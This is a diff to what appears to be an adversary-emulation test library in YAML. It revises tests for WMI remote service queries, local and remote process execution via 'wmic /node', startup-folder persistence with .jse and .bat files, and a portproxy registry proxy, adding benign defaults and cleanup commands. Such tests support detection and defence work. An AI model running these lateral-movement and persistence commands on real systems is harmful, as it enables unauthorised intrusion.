-      description: 'WMI List Remote Services
-
-'
+      description: "An adversary might use WMI to check if a certain Remote Service
+        is running on a remote device. \nWhen the test completes, a service information
+        will be displayed on the screen if it exists.\nA common feedback message is
+        that \"No instance(s) Available\" if the service queried is not running.\nA
+        common error message is \"Node - (provided IP or default)  ERROR Description
+        =The RPC server is unavailable\" \nif the provided remote host is unreacheable\n"
       supported_platforms:
       - windows
       input_arguments:
         node:
           description: Ip Address
           type: String
-          default: 192.168.0.1
+          default: 127.0.0.1
         service_search_string:
           description: Name Of Service
           type: String
-          default: sql server
+          default: Spooler
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'wmic /node:"#{node}" service where (caption like "%#{service_search_string}
-          (%")
+        command: 'wmic /node:"#{node}" service where (caption like "%#{service_search_string}%")
 
 '
     - name: WMI Execute Local Process
-      description: 'This test uses wmic.exe to execute a process on the local host.
-
-'
+      description: |
+        This test uses wmic.exe to execute a process on the local host.
+        When the test completes , a new process will be started locally .A notepad application will be started when input is left on default.
       supported_platforms:
       - windows
       input_arguments:
         process_to_execute:
           description: Name or path of process to execute.
           type: String
-          default: calc.exe
+          default: notepad.exe
       executor:
         name: command_prompt
         elevation_required: false
         command: 'wmic process call create #{process_to_execute}
 
 '
-    - name: WMI Execute Remote Process
-      description: 'This test uses wmic.exe to execute a process on a remote host.
+        cleanup_command: 'wmic process where name=''#{process_to_execute}'' delete
 
 '
+    - name: WMI Execute Remote Process
+      description: "This test uses wmic.exe to execute a process on a remote host.
+        Specify a valid value for remote IP using the node parameter.\nTo clean up,
+        provide the same node input as the one provided to run the test\nA common
+        error message is \"Node - (provided IP or default)  ERROR Description =The
+        RPC server is unavailable\" if the default or provided IP is unreachable \n"
       supported_platforms:
       - windows
       input_arguments:
         node:
           description: Ip Address
           type: String
-          default: 192.168.0.1
+          default: 127.0.0.1
         process_to_execute:
           description: Name or path of process to execute.
           type: String
-          default: calc.exe
+          default: notepad.exe
       executor:
         name: command_prompt
         elevation_required: false
         command: 'wmic /node:"#{node}" process call create #{process_to_execute}
+
+'
+        cleanup_command: 'wmic /node:"#{node}" process where name=''#{process_to_execute}''
+          delete
 
 '
   T1028:
@@ -25835,10 +25851,9 @@ lateral-movement:
           Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs" -ErrorAction Ignore
           Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs" -ErrorAction Ignore
     - name: Supicious jse file run from startup Folder
-      description: 'jse files can be placed in and ran from the startup folder to
-        maintain persistance
-
-'
+      description: |
+        jse files can be placed in and ran from the startup folder to maintain persistance.
+        Upon execution, "T1137 Hello, World JSE!" will be printed to the powershell session twice.
       supported_platforms:
       - windows
       executor:
@@ -25853,10 +25868,9 @@ lateral-movement:
           Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse" -ErrorAction Ignore
           Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse" -ErrorAction Ignore
     - name: Supicious bat file run from startup Folder
-      description: 'bat files can be placed in and ran from the startup folder to
-        maintain persistance
-
-'
+      description: |
+        bat files can be placed in and executed from the startup folder to maintain persistance.
+        Upon execution, cmd will be run and immediately closed.
       supported_platforms:
       - windows
       executor:
@@ -28396,8 +28410,9 @@ command-and-control:
           unset https_proxy
     - name: portproxy reg key
       description: |
-        Adds a registry key to set up a proxy on the endpoint at
-        HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4
+        Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4
+        Upon execution there will be a new proxy entry in netsh
+        netsh interface portproxy show all
       supported_platforms:
       - windows
       input_arguments:
